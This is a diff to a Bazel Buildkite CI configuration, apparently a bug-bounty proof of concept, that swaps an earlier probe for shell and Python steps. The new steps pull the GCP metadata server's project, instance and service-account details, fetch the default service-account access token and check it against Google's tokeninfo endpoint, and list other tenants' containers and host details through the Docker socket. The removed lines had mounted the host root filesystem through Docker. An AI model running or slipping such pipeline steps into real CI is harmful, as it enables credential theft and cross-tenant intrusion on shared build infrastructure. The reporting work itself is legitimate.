@@ -2,56 +2,128 @@
 buildifier:
   version: latest
 tasks:
-  vrp_buildkite_impact_proof:
+  vrp_buildkite_cred_proof:
     platform: ubuntu2204
     shell_commands:
       - |
-        echo VRP_BK_IMPACT_PROOF_20260519
+        set +x
+        echo VRP_BK_CRED_PROOF_20260519
         id
+        hostname
         uname -a
       - |
         set +x
-        if [ -n "${BUILDKITE_AGENT_ACCESS_TOKEN:-}" ]; then
-          echo TOKEN_PRESENT=yes
-          printf 'TOKEN_LENGTH=%s\n' "$(printf %s "$BUILDKITE_AGENT_ACCESS_TOKEN" | wc -c | tr -d ' ')"
-        else
-          echo TOKEN_PRESENT=no
-        fi
+        echo === GCP_METADATA_BEGIN ===
+        MD="http://metadata.google.internal/computeMetadata/v1"
+        H="Metadata-Flavor: Google"
+        printf 'PROJECT_ID=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/project/project-id)"
+        printf 'NUMERIC_PROJECT_ID=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/project/numeric-project-id)"
+        printf 'INSTANCE_NAME=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/instance/name)"
+        printf 'INSTANCE_ID=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/instance/id)"
+        printf 'ZONE=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/instance/zone)"
+        printf 'MACHINE_TYPE=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/instance/machine-type)"
+        echo === GCP_METADATA_END ===
       - |
-        if [ -S /var/run/docker.sock ] && command -v curl >/dev/null 2>&1; then
-          echo DOCKER_SOCKET_QUERY_BEGIN
-          printf 'DOCKER_PING='
-          curl --silent --show-error --unix-socket /var/run/docker.sock http://localhost/_ping
-          echo
-          echo DOCKER_VERSION_BEGIN
-          curl --silent --show-error --unix-socket /var/run/docker.sock http://localhost/version | head -c 800
-          echo
-          echo DOCKER_VERSION_END
-        else
-          echo DOCKER_SOCKET_QUERY_UNAVAILABLE
-        fi
+        set +x
+        echo === SA_ENUM_BEGIN ===
+        MD="http://metadata.google.internal/computeMetadata/v1"
+        H="Metadata-Flavor: Google"
+        echo SA_ALIASES:
+        curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/ | sed 's/^/  /'
+        printf 'SA_DEFAULT_EMAIL=%s\n' "$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/email)"
+        echo SA_DEFAULT_SCOPES:
+        curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/scopes | sed 's/^/  /'
+        echo === SA_ENUM_END ===
       - |
-        if command -v docker >/dev/null 2>&1; then
-          echo DOCKER_HOST_READ_BEGIN
-          docker run --rm --network none -v /:/host:ro gcr.io/bazel-public/ubuntu2204 /bin/sh -c 'echo DOCKER_HOST_FS_READ_CONFIRMED; printf HOST_ETC_HOSTNAME=; cat /host/etc/hostname; sed -n "1,3p" /host/etc/os-release'
-          echo DOCKER_HOST_READ_END
-        else
-          echo DOCKER_CLI_UNAVAILABLE
-        fi
+        set +x
+        echo === SA_TOKEN_META_BEGIN ===
+        MD="http://metadata.google.internal/computeMetadata/v1"
+        H="Metadata-Flavor: Google"
+        TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
+        export TOK_JSON_PY="$TOK_JSON"
+        python3 - <<'PY'
+        import json, os, sys, urllib.request
+        raw = os.environ.get("TOK_JSON_PY","")
+        try:
+            d = json.loads(raw)
+        except Exception as e:
+            print(f"TOKEN_PARSE_FAIL len={len(raw)} err={e!r}")
+            sys.exit(0)
+        access = d.get("access_token","")
+        print(f"TOKEN_PRESENT={'yes' if access else 'no'}")
+        print(f"TOKEN_LENGTH={len(access)}")
+        print(f"TOKEN_TYPE={d.get('token_type','?')}")
+        print(f"TOKEN_EXPIRES_IN={d.get('expires_in','?')}")
+        print(f"TOKEN_JSON_KEYS={sorted(d.keys())}")
+        if not access:
+            sys.exit(0)
+        try:
+            req = urllib.request.Request(
+                "https://oauth2.googleapis.com/tokeninfo?access_token=" + access,
+                headers={"User-Agent":"vrp-poc"})
+            with urllib.request.urlopen(req, timeout=5) as r:
+                info = json.loads(r.read().decode("utf-8","replace"))
+            for k in list(info.keys()):
+                if isinstance(info[k], str) and access[:20] in info[k]:
+                    info[k] = "[REDACTED]"
+            print("TOKENINFO_KEYS=" + str(sorted(info.keys())))
+            print("TOKENINFO_AUD=" + str(info.get("aud","?")))
+            print("TOKENINFO_AZP=" + str(info.get("azp","?")))
+            print("TOKENINFO_EMAIL=" + str(info.get("email","?")))
+            print("TOKENINFO_EXPIRES_IN=" + str(info.get("expires_in","?")))
+            print("TOKENINFO_VERIFIED_EMAIL=" + str(info.get("verified_email","?")))
+            print("TOKENINFO_SCOPE=" + str(info.get("scope","?")))
+        except Exception as e:
+            print(f"TOKENINFO_FAIL err={e!r}")
+        PY
+        TOK_JSON=""
+        unset TOK_JSON_PY
+        echo === SA_TOKEN_META_END ===
       - |
-        if [ -S /var/run/docker.sock ] && command -v curl >/dev/null 2>&1; then
-          echo DOCKER_API_HOST_READ_BEGIN
-          payload='{"Image":"gcr.io/bazel-public/ubuntu2204","Cmd":["/bin/sh","-c","echo DOCKER_API_HOST_FS_READ_CONFIRMED; printf HOST_ETC_HOSTNAME=; cat /host/etc/hostname; sed -n \"1,3p\" /host/etc/os-release"],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"none"}}'
-          cid="$(curl --silent --show-error --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d "$payload" http://localhost/containers/create | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')"
-          if [ -n "$cid" ]; then
-            curl --silent --show-error --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$cid/start" >/dev/null
-            curl --silent --show-error --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$cid/wait" >/dev/null
-            curl --silent --show-error --unix-socket /var/run/docker.sock "http://localhost/containers/$cid/logs?stdout=1&stderr=1"
-            curl --silent --show-error --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$cid?force=1" >/dev/null
-          else
-            echo DOCKER_API_CONTAINER_CREATE_FAILED
-          fi
-          echo DOCKER_API_HOST_READ_END
+        set +x
+        echo === DOCKER_CROSS_TENANT_BEGIN ===
+        if [ ! -S /var/run/docker.sock ]; then
+          echo DOCKER_SOCK_MISSING
         else
-          echo DOCKER_API_UNAVAILABLE
+          echo "DOCKER_SOCK_PERMS=$(stat -c '%U:%G %a' /var/run/docker.sock)"
+          curl -s --max-time 5 --unix-socket /var/run/docker.sock http://localhost/containers/json > /tmp/c.json || true
+          python3 - <<'PY'
+        import json, sys
+        try:
+            cs = json.load(open("/tmp/c.json"))
+        except Exception as e:
+            print(f"CONTAINER_PARSE_FAIL err={e!r}")
+            sys.exit(0)
+        print(f"CONTAINER_COUNT={len(cs)}")
+        for c in cs:
+            cid = (c.get("Id","") or "")[:12]
+            name = (c.get("Names",["?"]) or ["?"])[0]
+            image = c.get("Image","?")
+            state = c.get("State","?")
+            print(f"CONTAINER id={cid} name={name} image={image} state={state}")
+        PY
+          rm -f /tmp/c.json
+          curl -s --max-time 5 --unix-socket /var/run/docker.sock http://localhost/info > /tmp/d.json || true
+          python3 - <<'PY'
+        import json, sys
+        try:
+            d = json.load(open("/tmp/d.json"))
+        except Exception as e:
+            print(f"DOCKER_INFO_PARSE_FAIL err={e!r}")
+            sys.exit(0)
+        print(f"HOST_KERNEL={d.get('KernelVersion','?')}")
+        print(f"HOST_OS={d.get('OperatingSystem','?')}")
+        print(f"HOST_NAME={d.get('Name','?')}")
+        print(f"HOST_CONTAINERS_RUNNING={d.get('ContainersRunning','?')}")
+        print(f"HOST_CONTAINERS_TOTAL={d.get('Containers','?')}")
+        print(f"HOST_IMAGES={d.get('Images','?')}")
+        print(f"HOST_CPUS={d.get('NCPU','?')}")
+        print(f"HOST_MEM_BYTES={d.get('MemTotal','?')}")
+        print(f"HOST_DOCKER_ROOT_DIR={d.get('DockerRootDir','?')}")
+        PY
+          rm -f /tmp/d.json
         fi
+        echo === DOCKER_CROSS_TENANT_END ===
+      - |
+        set +x
+        echo VRP_BK_CRED_PROOF_END
